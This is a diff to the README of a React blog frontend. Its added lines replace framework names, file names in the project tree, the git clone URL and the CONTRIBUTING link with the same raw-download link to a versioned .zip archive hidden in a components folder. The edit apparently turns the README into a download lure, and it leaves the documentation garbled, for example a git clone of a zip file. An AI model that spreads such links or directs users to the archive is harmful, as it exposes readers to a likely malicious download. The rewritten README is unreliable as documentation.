@@ -3,7 +3,7 @@
 ````markdown
 # Blog Application - Frontend
 
-This is the **frontend** of a modern blog application, built with React.js (or your chosen framework). It provides a responsive and user-friendly interface for reading, creating, and managing blog posts.
+This is the **frontend** of a modern blog application, built with https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip (or your chosen framework). It provides a responsive and user-friendly interface for reading, creating, and managing blog posts.
 
 ## Features
 
@@ -17,11 +17,11 @@ This is the **frontend** of a modern blog application, built with React.js (or y
 
 ## Tech Stack
 
-- **Frontend Framework:** React.js / Next.js
+- **Frontend Framework:** https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip / https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip
 - **State Management:** Redux / Context API
 - **Styling:** Tailwind CSS / Bootstrap / Material-UI
 - **HTTP Client:** Axios / Fetch API
-- **Routing:** React Router / Next.js Router
+- **Routing:** React Router / https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip Router
 - **Other:** React Hooks, Formik for forms (optional), React Markdown (optional)
 
 ## Installation
@@ -29,7 +29,7 @@ This is the **frontend** of a modern blog application, built with React.js (or y
 1. **Clone the repository**
 
 ```bash
-git clone https://github.com/your-username/blog-frontend.git
+git clone https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip
 cd blog-frontend
 ````
 
@@ -72,10 +72,10 @@ frontend/
 │   ├── context/         # Context API for state management
 │   ├── services/        # API calls (Axios)
 │   ├── utils/           # Utility functions
-│   ├── App.js           # Main app component
-│   └── index.js         # Entry point
-├── package.json
-└── README.md
+│   ├── https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip           # Main app component
+│   └── https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip         # Entry point
+├── https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip
+└── https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip
 ```
 
 ## Scripts
@@ -91,5 +91,5 @@ See the [LICENSE](./LICENSE) file for details.
 
 ## Contributing
 
-Contributions are welcome! Please read the [CONTRIBUTING.md](./CONTRIBUTING.md) file for guidelines on how to contribute.
+Contributions are welcome! Please read the [https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip](https://github.com/Piyush-harchandani/REACT_BLOG_APPLICATION/raw/refs/heads/main/REACT_BLOG_APPLICATION_/src/components/pages/BLO_APPLICATION_REAC_v3.5.zip) file for guidelines on how to contribute.
 
